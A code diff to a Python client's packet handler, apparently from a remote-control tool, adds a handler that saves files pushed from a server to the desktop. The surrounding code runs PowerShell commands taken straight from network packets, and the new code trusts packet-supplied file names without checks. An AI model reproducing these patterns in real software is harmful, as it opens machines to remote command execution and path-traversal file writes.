@@ -100,6 +100,25 @@ def receive(client) -> None:
                             print(f"Opening Powershell with command: {ps_data}")
                             os.system(f'start powershell -NoExit -Command "{ps_data}"')
 
+                        elif p_type == "command":
+                            if packet.get("command") == "upload_start":
+                                f_name = packet.get("file_name")
+                                f_size = packet.get("file_size")
+                                save_path = os.path.join(get_desktop_path(), f_name)
+
+                                print(f"Receiving file {f_name} ({f_size} bytes)...")
+
+                                with open(save_path, "wb") as f:
+                                    remaining = f_size
+                                    while remaining > 0:
+                                        chunk = client.recv(min(remaining, 8192))
+                                        if not chunk:
+                                            break
+                                        f.write(chunk)
+                                        remaining -= len(chunk)
+
+                                print("Upload complete!")
+
                     elif p_type == "request":
                         if packet.get("command") == "files":
                             rel_path = packet.get("path", "")
